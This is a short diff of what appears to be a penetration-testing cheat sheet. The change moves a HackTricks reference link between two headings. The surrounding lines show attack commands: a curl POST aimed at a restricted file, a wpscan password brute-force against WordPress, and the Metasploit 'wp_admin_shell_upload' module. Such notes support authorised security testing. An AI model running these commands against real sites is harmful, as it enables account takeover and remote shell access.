@@ -475,13 +475,13 @@ curl -H "Content-Length:0" -X POST https://<domain>/restricted_file
 ```
 
 ### BruteForcing Wordpress
-https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
 
 ```
 wpscan -U <username> -P wordlist.txt --url http://url/wordpress
 ```
 
 ### pentesting wordpress
+https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
 
 ```
 use exploit/unix/webapp/wp_admin_shell_upload
